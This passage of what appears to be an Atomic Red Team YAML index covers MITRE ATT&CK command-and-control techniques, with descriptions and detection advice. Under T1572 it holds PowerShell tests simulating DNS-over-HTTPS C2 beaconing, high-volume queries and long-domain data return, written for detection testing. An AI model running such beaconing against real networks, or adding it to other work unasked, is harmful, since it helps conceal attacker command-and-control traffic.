        adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568).
        Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be
        encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua
        JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)
        in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or
        [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to
        further conceal C2 communications and infrastructure. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: "Monitoring for systems listening and/or establishing external
        connections using ports/protocols commonly associated with tunneling, such
        as SSH (port 22). Also monitor for processes commonly associated with tunneling,
        such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon
        data flows (e.g., a client sending significantly more data than it receives
        from a server). Processes utilizing the network that do not normally have
        network communication or have never been seen before are suspicious. Analyze
        packet contents to detect application layer protocols that do not follow the
        expected protocol standards regarding syntax, structure, or any other variable
        adversaries could leverage to conceal data.(Citation: University of Birmingham
        C2)"
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_is_subtechnique: false
      identifier: T1572
    atomic_tests:
    - name: DNS over HTTPS Large Query Volume
      auto_generated_guid: ae9ef4b0-d8c1-49d4-8758-06206f19af0a
      description: |
        This test simulates an infected host sending a large volume of DoH queries to a command and control server.
        The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
      supported_platforms:
      - windows
      input_arguments:
        doh_server:
          description: Default DoH resolver
          type: string
          default: https://8.8.8.8/resolve
        query_type:
          description: DNS query type
          type: string
          default: TXT
        subdomain:
          description: Subdomain prepended to the domain name
          type: string
          default: atomicredteam
        query_volume:
          description: Number of DNS queries to send
          type: integer
          default: 1000
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
      executor:
        command: 'for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest "#{doh_server}?name=#{subdomain}.$(Get-Random
          -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}" -UseBasicParsing).Content
          }

          '
        name: powershell
    - name: DNS over HTTPS Regular Beaconing
      auto_generated_guid: 0c5f9705-c575-42a6-9609-cbbff4b2fc9b
      description: |
        This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
        This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
      supported_platforms:
      - windows
      input_arguments:
        doh_server:
          description: Default DoH resolver
          type: string
          default: https://8.8.8.8/resolve
        runtime:
          description: Time in minutes to run the simulation
          type: integer
          default: 30
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
        subdomain:
          description: Subdomain prepended to the domain name
          type: string
          default: atomicredteam
        query_type:
          description: DNS query type
          type: string
          default: TXT
        c2_interval:
          description: Seconds between C2 requests to the command and control server
          type: integer
          default: 30
        c2_jitter:
          description: Percentage of jitter to add to the C2 interval to create variance
            in the times between C2 requests
          type: integer
          default: 20
      executor:
        command: |
          Set-Location PathToAtomicsFolder
          .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
        name: powershell
    - name: DNS over HTTPS Long Domain Query
      auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
      description: |
        This test simulates an infected host returning data to a command and control server using long domain names.
        The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
         Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
      supported_platforms:
      - windows
      input_arguments:
        doh_server:
          description: Default DoH resolver
          type: string
          default: https://8.8.8.8/resolve
        query_type:
          description: DNS query type
          type: string
          default: TXT
        subdomain:
          description: Subdomain prepended to the domain name (should be 63 characters
            to test maximum length)
          type: string
          default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
        domain:
          description: Default domain to simulate against
          type: string
          default: 127.0.0.1.xip.io
      executor:
        command: |
          Set-Location PathToAtomicsFolder
          .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
        name: powershell
  T1483:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Sylvain Gil, Exabeam
      - Barry Shteiman, Exabeam
      - Ryan Benson, Exabeam
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--54456690-84de-4538-9101-643e26437e09
      type: attack-pattern
      created: '2019-02-18T17:22:57.831Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1483
        url: https://attack.mitre.org/techniques/T1483
      - source_name: Cybereason Dissecting DGAs
        url: http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf
        description: 'Sternfeld, U. (2016). Dissecting Domain Generation Algorithms:
          Eight Real World DGA Variants. Retrieved February 18, 2019.'
      - source_name: Cisco Umbrella DGA
        url: https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/
        description: Scarfo, A. (2016, October 10). Domain Generation Algorithms â€“
          Why so effective?. Retrieved February 18, 2019.
      - source_name: Unit 42 DGA Feb 2019
        url: https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/
        description: 'Unit 42. (2019, February 7). Threat Brief: Understanding Domain
          Generation Algorithms (DGA). Retrieved February 19, 2019.'
      - url: http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html
        description: 'Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast
          Number of Machines at Risk. Retrieved March 9, 2018.'
        source_name: Talos CCleanup 2017
      - source_name: Akamai DGA Mitigation
        url: https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html
        description: Liu, H. and Yuzifovich, Y. (2018, January 9). A Death Match of
          Domain Generation Algorithms. Retrieved February 18, 2019.
      - url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html
        description: Dunwoody, M.. (2017, April 3). Dissecting One of APT29â€™s Fileless
          WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.
        source_name: FireEye POSHSPY April 2017
      - source_name: ESET Sednit 2017 Activity
        url: https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/
        description: 'ESET. (2017, December 21). Sednit update: How Fancy Bear Spent
          the Year. Retrieved February 18, 2019.'
      - source_name: Data Driven Security DGA
        url: https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/
        description: 'Jacobs, J. (2014, October 2). Building a DGA Classifier: Part
          2, Feature Engineering. Retrieved February 18, 2019.'
      - source_name: Pace University Detecting DGA May 2017
        url: http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf
        description: Chen, L., Wang, T.. (2017, May 5). Detecting Algorithmically
          Generated Domains Using Data Visualization and N-Grams Methods . Retrieved
          April 26, 2019.
      - source_name: Elastic Predicting DGA
        url: https://arxiv.org/pdf/1611.00791.pdf
        description: Ahuja, A., Anderson, H., Grant, D., Woodbridge, J.. (2016, November
          2). Predicting Domain Generation Algorithms with Long Short-Term Memory
          Networks. Retrieved April 26, 2019.
      modified: '2020-11-10T18:28:56.957Z'
      name: Domain Generation Algorithms
      description: |-
        Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

        DGAs can take the form of apparently random or â€œgibberishâ€? strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

        Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.

        Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain or related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1071.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b
      type: attack-pattern
      created: '2020-03-15T16:21:45.131Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1071.003
        url: https://attack.mitre.org/techniques/T1071/003
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-10-21T16:35:45.633Z'
      name: Mail Protocols
      description: "Adversaries may communicate using application layer protocols
        associated with electronic mail delivery to avoid detection/network filtering
        by blending in with existing traffic. Commands to the remote system, and often
        the results of those commands, will be embedded within the protocol traffic
        between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP
        that carry electronic mail may be very common in environments.  Packets produced
        from these protocols may have many fields and headers in which data can be
        concealed. Data could also be concealed within the email messages themselves.
        An adversary may abuse these protocols to communicate with systems under their
        control within a victim network while also mimicking normal, expected traffic. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows (e.g., a client
        sending significantly more data than it receives from a server). Processes
        utilizing the network that do not normally have network communication or have
        never been seen before are suspicious. Analyze packet contents to detect application
        layer protocols that do not follow the expected protocol standards regarding
        syntax, structure, or any other variable adversaries could leverage to conceal
        data.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1092:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--64196062-5210-42c3-9a02-563a0d1797ef
      type: attack-pattern
      created: '2017-05-31T21:31:09.379Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1092
        external_id: T1092
      modified: '2020-07-14T19:44:50.871Z'
      name: Communication Through Removable Media
      description: Adversaries can perform command and control between compromised
        hosts on potentially disconnected networks using removable media to transfer
        commands from system to system. Both systems would need to be compromised,
        with the likelihood that an Internet-connected system was compromised first
        and the second through lateral movement by [Replication Through Removable
        Media](https://attack.mitre.org/techniques/T1091). Commands and files would
        be relayed from the disconnected system to the Internet-connected system to
        which the adversary has direct access.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: Monitor file access on removable media. Detect processes
        that execute when removable media is mounted.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Drive: Drive Creation'
      - 'Drive: Drive Access'
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1090.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--69b8fd78-40e8-4600-ae4d-662c9d7afdb3
      type: attack-pattern
      created: '2020-03-14T23:12:18.466Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1090.002
        url: https://attack.mitre.org/techniques/T1090/002
      - url: http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/
        description: 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools
          of the Trade. Retrieved December 2, 2015.'
        source_name: Trend Micro APT Attack Tools
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-27T17:50:37.411Z'
      name: External Proxy
      description: |-
        Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.

        External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Analyze network data for uncommon data flows, such as a
        client sending significantly more data than it receives from an external server.
        Processes utilizing the network that do not normally have network communication
        or have never been seen before are suspicious. Analyze packet contents to
        detect communications that do not follow the expected protocol behavior for
        the port that is being used.(Citation: University of Birmingham C2)'
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Connection Creation'
    atomic_tests: []
  T1090:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jon Sheedy
      - Heather Linn
      - Walker Johnson
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea
      type: attack-pattern
      created: '2017-05-31T21:31:08.479Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1090
        url: https://attack.mitre.org/techniques/T1090
      - url: http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/
        description: 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools
          of the Trade. Retrieved December 2, 2015.'
        source_name: Trend Micro APT Attack Tools
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2021-08-30T19:16:11.648Z'
      name: Proxy
      description: |-
        Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.

        Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: |-
        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

        Consider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).
      x_mitre_version: '3.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1568:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Chris Roffe
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b
      type: attack-pattern
      created: '2020-03-10T17:28:11.747Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1568
        url: https://attack.mitre.org/techniques/T1568
      - url: http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html
        description: 'Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast
          Number of Machines at Risk. Retrieved March 9, 2018.'
        source_name: Talos CCleanup 2017
      - url: https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html
        description: Dunwoody, M.. (2017, April 3). Dissecting One of APT29â€™s Fileless
          WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.
        source_name: FireEye POSHSPY April 2017
      - source_name: ESET Sednit 2017 Activity
        url: https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/
        description: 'ESET. (2017, December 21). Sednit update: How Fancy Bear Spent
          the Year. Retrieved February 18, 2019.'
      - source_name: Data Driven Security DGA
        url: https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/
        description: 'Jacobs, J. (2014, October 2). Building a DGA Classifier: Part
          2, Feature Engineering. Retrieved February 18, 2019.'
      modified: '2022-03-11T18:26:23.782Z'
      name: Dynamic Resolution
      description: |-
        Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.

        Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Detecting dynamically generated C2 can be challenging due
        to the number of different algorithms, constantly evolving malware families,
        and the increasing complexity of the algorithms. There are multiple approaches
        to detecting a pseudo-randomly generated domain name, including using frequency
        analysis, Markov chains, entropy, proportion of dictionary words, ratio of
        vowels to other characters, and more (Citation: Data Driven Security DGA).
        CDN domains may trigger these detections due to the format of their domain
        names. In addition to detecting algorithm generated domains based on the name,
        another more general approach for detecting a suspicious domain is to check
        for recently registered names or for rarely visited domains.'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1188:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--7d751199-05fa-4a72-920f-85df4506c76c
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1188
        external_id: T1188
      modified: '2020-03-14T23:25:20.928Z'
      name: Multi-hop Proxy
      description: To disguise the source of malicious traffic, adversaries may chain
        together multiple proxies. Typically, a defender will be able to identify
        the last proxy traffic traversed before it enters their network; the defender
        may or may not be able to identify any previous proxies before the last-hop
        proxy. This technique makes identifying the original source of the malicious
        traffic even more difficult by requiring the defender to trace malicious traffic
        through several proxies to identify its source.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: When observing use of Multi-hop proxies, network data from
        the actual command and control servers could allow correlating incoming and
        outgoing flows to trace malicious traffic back to its source. Multi-hop proxies
        can also be detected by alerting on traffic to known anonymity networks (such
        as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure
        that uses this technique.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1102:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Anastasios Pingios
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
      type: attack-pattern
      created: '2017-05-31T21:31:13.915Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1102
        url: https://attack.mitre.org/techniques/T1102
      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
        source_name: University of Birmingham C2
      modified: '2020-03-26T23:26:10.297Z'
      name: Web Service
      description: |-
        Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: 'Host data that can relate unknown or suspicious process
        activity using a network connection is important to supplement any existing
        indicators of compromise based on malware command and control signatures and
        infrastructure or the presence of strong encryption. Packet capture analysis
        will require SSL/TLS inspection if data is encrypted. Analyze network data
        for uncommon data flows (e.g., a client sending significantly more data than
        it receives from a server). User behavior monitoring may help to detect abnormal
        patterns of activity.(Citation: University of Birmingham C2)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1568.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1
      type: attack-pattern
      created: '2020-03-11T14:56:34.154Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1568.003
        url: https://attack.mitre.org/techniques/T1568/003
      - url: http://www.crowdstrike.com/blog/whois-numbered-panda/
        description: Meyers, A. (2013, March 29). Whois Numbered Panda. Retrieved
          January 14, 2016.
        source_name: Meyers Numbered Panda
      - url: https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html
        description: Moran, N., Oppenheim, M., Engle, S., & Wartell, R.. (2014, September
          3). Darwinâ€™s Favorite APT Group &#91;Blog&#93;. Retrieved November 12, 2014.
        source_name: Moran 2014
      - source_name: Rapid7G20Espionage
        description: Rapid7. (2013, August 26). Upcoming G20 Summit Fuels Espionage
          Operations. Retrieved March 6, 2017.
        url: https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/
      modified: '2020-03-27T20:54:28.287Z'
      name: DNS Calculation
      description: |-
        Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)

        One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: Detection for this technique is difficult because it would
        require knowledge of the specific implementation of the port calculation algorithm.
        Detection may be possible by analyzing DNS records if the algorithm is known.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
    atomic_tests: []
  T1104:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91
      type: attack-pattern
      created: '2017-05-31T21:31:15.935Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1104
        external_id: T1104
      modified: '2020-07-14T19:43:38.181Z'
      name: Multi-Stage Channels
      description: |-
        Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

        Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

        The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: command-and-control
      x_mitre_detection: Host data that can relate unknown or suspicious process activity
        using a network connection is important to supplement any existing indicators
        of compromise based on malware command and control signatures and infrastructure.
        Relating subsequent actions that may result from Discovery of the system and
        network information or Lateral Movement to the originating process may also
        yield useful data.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1205.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      x_mitre_domains:
      - enterprise-attack
